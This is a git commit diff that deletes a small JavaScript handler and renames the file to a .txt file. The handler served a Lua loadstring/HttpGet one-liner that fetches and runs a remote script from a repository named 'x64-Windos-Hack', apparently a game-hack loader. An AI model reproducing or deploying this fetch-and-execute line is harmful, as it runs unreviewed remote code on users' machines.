8c778201286c4eca6a5bb2aa5ad8f6f4a9bd01b2
Dkzin.rlk <79470887+SrDark222@users.noreply.github.com>
2025-06-14 20:04:39 -0300

    Update and rename inject.js to inject.txt

--- inject.js
+++
@@ -1,4 +0,0 @@
-export default function handler(req, res) {
-  res.setHeader("Content-Type", "text/plain");
-  res.send(`loadstring(game:HttpGet("https://raw.githubusercontent.com/SrDark222/x64-Windos-Hack/refs/heads/main/inject"))()`);
-}
